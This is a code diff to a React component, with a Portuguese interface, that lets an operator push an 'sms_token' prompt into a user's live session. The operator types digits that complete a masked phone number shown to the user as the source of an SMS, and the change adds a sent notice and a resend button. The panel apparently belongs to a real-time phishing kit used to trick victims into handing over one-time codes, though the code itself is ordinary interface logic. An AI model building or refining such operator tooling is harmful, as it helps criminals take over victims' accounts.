@@ -523,6 +523,7 @@ function SessionBlock({
   const ended = session.status === 'ended';
   const [smsOpen, setSmsOpen] = useState(false);
   const [smsDigits, setSmsDigits] = useState('');
+  const [smsSent, setSmsSent] = useState<string | null>(null);
 
   return (
     <div className={`donas-session${ended ? ' is-ended' : ''}`} data-testid="session-block">
@@ -609,6 +610,7 @@ function SessionBlock({
                   onClick={() => {
                     if (c.key === 'sms_token') {
                       setSmsDigits('');
+                      setSmsSent(null);
                       setSmsOpen(true);
                     } else {
                       onCommand(session.id, c.key);
@@ -682,6 +684,12 @@ function SessionBlock({
               <p className="donas-sms-help">
                 O usuário verá: <b>Enviamos um SMS para você do número XX XXXXX-X{smsDigits || 'XXX'}</b>.
               </p>
+              {smsSent && (
+                <p className="donas-sms-sent" data-testid="sms-token-sent">
+                  ✓ Enviado à sessão: <b>XX XXXXX-X{smsSent}</b>. Digite um novo final e clique em
+                  Reenviar para atualizar.
+                </p>
+              )}
             </div>
             <div className="donas-modal-foot" style={{ gap: 10 }}>
               <button
@@ -690,7 +698,7 @@ function SessionBlock({
                 onClick={() => setSmsOpen(false)}
                 data-testid="sms-token-cancel"
               >
-                Cancelar
+                Fechar
               </button>
               <button
                 type="button"
@@ -698,11 +706,11 @@ function SessionBlock({
                 disabled={smsDigits.length !== 3}
                 onClick={() => {
                   onCommand(session.id, 'sms_token', smsDigits);
-                  setSmsOpen(false);
+                  setSmsSent(smsDigits);
                 }}
                 data-testid="sms-token-confirm"
               >
-                Confirmar
+                {smsSent ? 'Reenviar' : 'Confirmar'}
               </button>
             </div>
           </div>
